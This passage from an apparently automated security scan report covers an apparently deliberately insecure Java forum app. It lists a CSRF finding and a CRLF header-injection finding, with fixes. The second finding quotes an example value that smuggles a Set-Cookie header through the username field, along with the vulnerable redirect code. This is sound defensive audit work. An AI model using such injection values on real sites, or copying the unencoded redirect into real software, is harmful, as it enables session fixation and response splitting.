            "impact": 3,
            "likelihood": 3.5,
            "snippetStartLine": 36,
            "summary": "POST /messages/compose has no CSRF token; any website can silently post messages as the logged-in user.",
            "remediationSummary": "Add CSRF token validation to the compose POST endpoint — use Spring Security CSRF support or manually generate/validate a per-session token in a hidden form field.",
            "remediation": "1. **Spring Security (recommended):** Add Spring Security to the project; it enables CSRF protection by default for all state-changing requests.\n2. **Manual CSRF token:** In the GET handler for `/messages/compose`, generate a cryptographically random token, store it in the HTTP session, and embed it as a hidden field in the form. Validate the token in `composeSubmit()` before processing the request.\n3. The `SameSite=Strict` or `SameSite=Lax` cookie attribute on the `user` cookie would also mitigate CSRF for modern browsers."
          }
        },
        {
          "ruleId": "header-manipulation",
          "level": "error",
          "message": {
            "text": "In AuthenticationController.loginSubmit(), the user-supplied username POST parameter is concatenated without any sanitisation directly into a redirect URL:\n\nreturn new RedirectView(\"/auth/login?username=\" + username, true);\n\nRedirectView eventually writes the URL into the HTTP Location response header. If username contains unencoded CRLF sequences (e.g., %0d%0aSet-Cookie:%20session=attacker), an attacker can inject arbitrary HTTP headers into the response. This enables:\nSession fixation via injected Set-Cookie headers.\nCache poisoning by injecting a fake Content-Type or body delimiter.\nXSS by injecting a crafted second HTTP response with a malicious body.\n\nAlthough modern versions of Tomcat strip literal CRLF from sendRedirect, the application itself performs no sanitisation, and the path remains vulnerable where servlet containers are less strictly hardened or when the Location header is constructed differently.",
            "markdown": "\nIn `AuthenticationController.loginSubmit()`, the user-supplied `username` POST parameter is concatenated without any sanitisation directly into a redirect URL:\n\n```java\nreturn new RedirectView(\"/auth/login?username=\" + username, true);\n```\n\n`RedirectView` eventually writes the URL into the HTTP `Location` response header. If `username` contains unencoded CRLF sequences (e.g., `%0d%0aSet-Cookie:%20session=attacker`), an attacker can inject arbitrary HTTP headers into the response. This enables:\n\n- **Session fixation** via injected `Set-Cookie` headers.\n- **Cache poisoning** by injecting a fake `Content-Type` or body delimiter.\n- **XSS** by injecting a crafted second HTTP response with a malicious body.\n\nAlthough modern versions of Tomcat strip literal CRLF from `sendRedirect`, the application itself performs no sanitisation, and the path remains vulnerable where servlet containers are less strictly hardened or when the `Location` header is constructed differently.\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "src/main/java/com/example/insecureforum/web/AuthenticationController.java"
                },
                "region": {
                  "startLine": 45,
                  "snippet": {
                    "text": "        if(userDao.authenticate(username, password)) {\n            setCookie(request, response, username);\n            return new RedirectView(\"/\", true);\n        } else {\n            eraseCookie(request, response);\n            return new RedirectView(\"/auth/login?username=\" + username, true);\n        }\n    }\n\n    @RequestMapping(value = \"/auth/logout\", method = RequestMethod.GET)\n    public RedirectView logout(HttpServletRequest request, HttpServletResponse response) {"
                  }
                }
              }
            }
          ],
          "fingerprints": {
            "fortify/instance-id": "242726A7F31D67596B18D9D6E55E1A6D"
          },
          "properties": {
            "impact": 3,
            "likelihood": 2,
            "snippetStartLine": 40,
            "summary": "User-supplied username concatenated unencoded into redirect URL, enabling CRLF injection and potential HTTP Response Splitting",
            "remediationSummary": "URL-encode the username before concatenating it into the redirect Location header to prevent CRLF injection.",
            "remediation": "\nURL-encode the username before embedding it in the redirect URL, and additionally strip any CR/LF characters defensively:\n\n```java\nString safeUsername = URLEncoder.encode(username, StandardCharsets.UTF_8);\nreturn new RedirectView(\"/auth/login?username=\" + safeUsername, true);\n```\n\nThis ensures the value is always treated as a URL query-parameter token and cannot inject additional header lines. Note that the separate XSS exposure in `login.jsp` (reflecting `${prefillUsername}` unescaped) should also be addressed.\n"
          }
        }
